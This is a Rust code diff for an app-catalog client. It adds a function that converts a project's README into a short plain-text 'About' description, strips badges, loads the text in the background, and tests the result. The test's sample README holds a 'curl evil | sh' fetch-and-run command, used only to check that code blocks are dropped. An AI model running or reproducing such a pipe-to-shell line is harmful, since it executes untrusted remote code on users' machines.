@@ -173,6 +173,37 @@ fn tint_for(id: &str) -> slint::Color {
 
 /// Release notes are Markdown, often with HTML mixed in; show them as readable plain
 /// text. Links keep their words, images and tags go, list markers become bullets.
+/// The opening of a README as plain text: what the project says it is, without the
+/// title (the page already shows it), badges, pictures, tables or code samples.
+fn plain_about(markdown: &str) -> String {
+    const LIMIT: usize = 900;
+    let mut kept = Vec::new();
+    let (mut in_code, mut title_dropped) = (false, false);
+    for line in markdown.lines() {
+        let start = line.trim_start();
+        if start.starts_with("```") || start.starts_with("~~~") {
+            in_code = !in_code;
+            continue;
+        }
+        if in_code || start.starts_with('|') {
+            continue;
+        }
+        if !title_dropped && start.starts_with("# ") {
+            title_dropped = true;
+            continue;
+        }
+        kept.push(line);
+    }
+    let text = plain_notes(&kept.join("\n"));
+    if text.chars().count() <= LIMIT {
+        return text;
+    }
+    // Stop at the end of a line rather than mid-sentence.
+    let cut: String = text.chars().take(LIMIT).collect();
+    let end = cut.rfind('\n').filter(|&i| i > LIMIT / 2).unwrap_or(cut.len());
+    format!("{}\n…", cut[..end].trim_end())
+}
+
 fn plain_notes(markdown: &str) -> String {
     let mut out = String::new();
     let mut blank_run = 0;
@@ -214,6 +245,20 @@ fn strip_inline_markup(line: &str) -> String {
     let mut i = 0;
     while i < chars.len() {
         let c = chars[i];
+        // A picture that is also a link (`[![alt](picture)](target)`, the shape of every
+        // badge) disappears entirely.
+        if c == '[' && chars.get(i + 1) == Some(&'!') && chars.get(i + 2) == Some(&'[') {
+            let find = |from: usize, what: char| (from..chars.len()).find(|&j| chars[j] == what);
+            let whole = find(i + 3, ']')
+                .filter(|&alt| chars.get(alt + 1) == Some(&'('))
+                .and_then(|alt| find(alt + 2, ')'))
+                .filter(|&picture| chars.get(picture + 1) == Some(&']') && chars.get(picture + 2) == Some(&'('))
+                .and_then(|picture| find(picture + 3, ')'));
+            if let Some(end) = whole {
+                i = end + 1;
+                continue;
+            }
+        }
         let image = c == '!' && chars.get(i + 1) == Some(&'[');
         if c == '[' || image {
             let open = if image { i + 1 } else { i };
@@ -810,6 +855,7 @@ impl App {
         store.set_unavailable(SharedString::new());
         store.set_warning(SharedString::new());
         store.set_notes(SharedString::new());
+        store.set_about(SharedString::new());
         store.set_release_date(SharedString::new());
         store.set_release_age(SharedString::new());
         store.set_license(SharedString::new());
@@ -844,6 +890,7 @@ impl App {
             return;
         };
         store.set_details_loading(true);
+        let about_id = app_id.clone();
         self.job(
             move |app| app.catalog().details(&app_id).map_err(|e| e.to_string()),
             move |app, ui, result| {
@@ -851,12 +898,29 @@ impl App {
                     return;
                 }
                 match result {
-                    Ok(details) => app.show_details(ui, details),
+                    Ok(details) => {
+                        app.show_details(ui, details);
+                        app.load_about(about_id, generation);
+                    }
                     Err(message) => {
                         let store = ui.global::<Store>();
                         store.set_details_loading(false);
                         store.set_details_error(message.into());
                     }
+                }
+            },
+        );
+    }
+
+    /// Fetch the project's own description once the page is usable. It is extra: if it
+    /// cannot be had (no README, offline, out of requests) the page simply has no
+    /// About section.
+    fn load_about(self: &Arc<Self>, id: AppId, generation: u64) {
+        self.job(
+            move |app| app.catalog().about(&id).ok().flatten().map(|text| plain_about(&text)).unwrap_or_default(),
+            move |app, ui, about| {
+                if app.details_generation.load(Ordering::SeqCst) == generation {
+                    ui.global::<Store>().set_about(about.into());
                 }
             },
         );
@@ -1746,5 +1810,20 @@ mod tests {
     fn dates_and_tints_are_stable() {
         assert_eq!(unix_date(1_700_000_000), "2023-11-14");
         assert_eq!(tint_for("github:a/b"), tint_for("github:a/b"));
+    }
+
+    #[test]
+    fn a_readme_becomes_a_short_plain_description() {
+        let readme = "<p align=\"center\"><img src=\"logo.png\"></p>\n\n# Thing\n\n[![build](b.svg)](ci)\n\nThing does **one** job well.\n\n## Install\n\n```sh\ncurl evil | sh\n```\n\n| a | b |\n|---|---|\n\n- Fast\n- See the [docs](https://x.invalid)\n";
+        let about = plain_about(readme);
+        assert_eq!(about, "Thing does one job well.\n\nInstall\n\n•  Fast\n•  See the docs");
+        let long = format!("# T\n\n{}", "A sentence of filler text here.\n\n".repeat(80));
+        let cut = plain_about(&long);
+        assert!(
+            cut.chars().count() <= 902 && cut.ends_with("here.\n…"),
+            "cut at a line end: {:?}",
+            &cut[cut.len() - 20..]
+        );
+        assert_eq!(plain_about(""), "");
     }
 }
